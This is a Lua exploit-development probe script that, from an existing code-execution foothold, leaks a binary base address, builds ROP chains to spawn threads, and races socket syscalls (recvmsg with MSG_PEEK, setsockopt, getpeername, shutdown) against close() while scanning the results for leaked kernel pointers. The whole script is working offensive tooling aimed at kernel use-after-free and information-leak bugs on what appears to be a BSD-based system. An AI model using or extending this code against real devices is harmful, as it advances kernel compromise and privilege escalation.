-- CRASH_CLASS: MODERATE
-- PROBE 93e6: accept/close race + recvmsg ancillary during close
--
-- Two race vectors:
-- A) Listen socket accept() while child closes the listening fd
--    accept() dereferences the socket's accept queue; if close()
--    tears down the socket mid-accept, the queue pointer is stale.
-- B) recvmsg with MSG_PEEK on a unix socket while child closes it
--    The kernel copies socket buffer data; close() frees the buffers.
-- C) setsockopt while child closes - option processing on freed socket

print("=== PROBE 93e6: ACCEPT/CLOSE + RECVMSG RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E93E6, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- ======== SECTION A: recvmsg MSG_PEEK during close race ========
-- Write data to unix socket, then race recvmsg(MSG_PEEK) vs close()
-- MSG_PEEK reads without consuming - kernel walks the socket buffer chain
-- If close() tears down buffers while recvmsg peeks, stale pointers
print("--- Section A: recvmsg MSG_PEEK vs close race ---")

local peek_anomalies = 0
for iter = 1, 20 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then print("socketpair fail"); break end

    -- Write data to fd0 so fd1 has something to peek
    local wbuf = memory.alloc(256)
    for j = 0, 252, 4 do wd(N(wbuf)+j, 0xAA000000 + iter*256 + j) end
    pcall(function() mk(4)(uint64(fd0), uint64(N(wbuf)), uint64(256)) end)

    local done = memory.alloc(8); wd(N(done), 0)
    -- Child: close fd1 (the reading end)
    local spawned = spawn_child({{6, fd1}}, N(done))

    if spawned then
        -- Main: recvmsg on fd1 with MSG_PEEK (0x2)
        -- struct msghdr: name(8) namelen(4) pad(4) iov(8) iovlen(8) control(8) controllen(8) flags(4)
        local iov_buf = memory.alloc(512)
        for j = 0, 508, 4 do wd(N(iov_buf)+j, 0xDE000000+j) end

        local iov = memory.alloc(16)
        wq(N(iov), uint64(N(iov_buf)))
        wq(N(iov)+8, uint64(512))

        local msg = memory.alloc(64)
        for j = 0, 60, 4 do wd(N(msg)+j, 0) end
        wq(N(msg)+0x10, uint64(N(iov)))   -- msg_iov
        wq(N(msg)+0x18, uint64(1))        -- msg_iovlen

        local ok_r, rv_r = pcall(function()
            return mk(27)(uint64(fd1), uint64(N(msg)), uint64(0x2)) -- recvmsg MSG_PEEK
        end)
        local recv_ret = ok_r and N(rv_r) or -999
        if recv_ret >= 0x80000000 then recv_ret = recv_ret - 0x100000000 end

        for w = 1, 50000 do if (rd(N(done)) or 0) ~= 0 then break end end

        -- Scan received data for kernel pointers
        if recv_ret > 0 then
            for j = 0, math.min(recv_ret-1, 508), 4 do
                local lo = rd(N(iov_buf)+j) or 0
                local hi = rd(N(iov_buf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    peek_anomalies = peek_anomalies + 1
                    print(string.format("  iter %d +%02X: KPTR 0x%08X%08X", iter, j, hi, lo))
                end
            end
        elseif recv_ret ~= -1 and recv_ret ~= -999 then
            print(string.format("  iter %d: unexpected recv_ret=%d", iter, recv_ret))
        end
    end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("peek_races=20 anomalies=%d", peek_anomalies))

-- ======== SECTION B: setsockopt race vs close ========
-- Setting SO_SNDBUF/SO_RCVBUF while closing from child
-- sopt processing dereferences the socket struct
print("")
print("--- Section B: setsockopt vs close race ---")

local sopt_anomalies = 0
for iter = 1, 20 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    local spawned = spawn_child({{6, fd0}}, N(done))

    if spawned then
        -- Main: setsockopt(fd0, SOL_SOCKET=0xFFFF, SO_SNDBUF=0x1001, &val, 4)
        local val = memory.alloc(8); wd(N(val), 0x10000)
        local ok_s, rv_s = pcall(function()
            return mk(105)(uint64(fd0), uint64(0xFFFF), uint64(0x1001), uint64(N(val)), uint64(4))
        end)
        local sopt_ret = ok_s and N(rv_s) or -999
        if sopt_ret >= 0x80000000 then sopt_ret = sopt_ret - 0x100000000 end

        -- Also try getsockopt to read back
        local outval = memory.alloc(8); wd(N(outval), 0xDEADBEEF)
        local outlen = memory.alloc(8); wd(N(outlen), 4)
        local ok_g, rv_g = pcall(function()
            return mk(118)(uint64(fd0), uint64(0xFFFF), uint64(0x1001), uint64(N(outval)), uint64(N(outlen)))
        end)
        local gopt_ret = ok_g and N(rv_g) or -999
        if gopt_ret >= 0x80000000 then gopt_ret = gopt_ret - 0x100000000 end

        for w = 1, 50000 do if (rd(N(done)) or 0) ~= 0 then break end end

        local got_val = rd(N(outval)) or 0
        if gopt_ret == 0 and got_val ~= 0xDEADBEEF then
            -- Check if the returned value makes sense
            if got_val > 0x100000 then
                sopt_anomalies = sopt_anomalies + 1
                print(string.format("  iter %d: getsockopt=0x%08X LARGE VALUE", iter, got_val))
            end
        end
    end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("sopt_races=20 anomalies=%d", sopt_anomalies))

-- ======== SECTION C: getsockname/getpeername on closing socket ========
-- These copy out sockaddr from the socket; if socket is freed mid-copy,
-- kernel reads from freed memory into user buffer
print("")
print("--- Section C: getpeername vs close race ---")

local peer_anomalies = 0
for iter = 1, 20 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    local spawned = spawn_child({{6, fd0}}, N(done))

    if spawned then
        -- Main: getpeername(31) on fd0
        local addr = memory.alloc(128)
        for j = 0, 124, 4 do wd(N(addr)+j, 0xDE000000+j) end
        local alen = memory.alloc(8); wd(N(alen), 128)

        local ok_p, rv_p = pcall(function()
            return mk(31)(uint64(fd0), uint64(N(addr)), uint64(N(alen)))
        end)
        local peer_ret = ok_p and N(rv_p) or -999
        if peer_ret >= 0x80000000 then peer_ret = peer_ret - 0x100000000 end

        for w = 1, 50000 do if (rd(N(done)) or 0) ~= 0 then break end end

        -- Scan for kernel pointers
        if peer_ret == 0 then
            local real_len = rd(N(alen)) or 0
            for j = 0, math.min(real_len, 120), 4 do
                local lo = rd(N(addr)+j) or 0
                local hi = rd(N(addr)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    peer_anomalies = peer_anomalies + 1
                    print(string.format("  iter %d +%02X: KPTR 0x%08X%08X", iter, j, hi, lo))
                end
            end
        end
    end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("peer_races=20 anomalies=%d", peer_anomalies))

-- ======== SECTION D: shutdown vs close race ========
-- shutdown(2) on a socket being closed - different teardown path
print("")
print("--- Section D: shutdown vs close race ---")

local shut_anomalies = 0
for iter = 1, 20 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    local spawned = spawn_child({{6, fd0}}, N(done))

    if spawned then
        -- Main: shutdown(fd0, SHUT_RDWR=2)
        local ok_s, rv_s = pcall(function()
            return mk(134)(uint64(fd0), uint64(2))
        end)
        local shut_ret = ok_s and N(rv_s) or -999
        if shut_ret >= 0x80000000 then shut_ret = shut_ret - 0x100000000 end

        for w = 1, 50000 do if (rd(N(done)) or 0) ~= 0 then break end end

        -- shutdown on closed fd should return -1 (EBADF)
        -- If it returns 0, the fd was still live when we called shutdown
        -- That's fine. But check for crashes or weird states.
        if shut_ret ~= 0 and shut_ret ~= -1 and shut_ret ~= -999 then
            shut_anomalies = shut_anomalies + 1
            print(string.format("  iter %d: shutdown=%d UNEXPECTED", iter, shut_ret))
        end
    end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("shut_races=20 anomalies=%d", shut_anomalies))

print("")
print("alive=" .. tostring(alive()))
print("=== 93e6 COMPLETE ===")
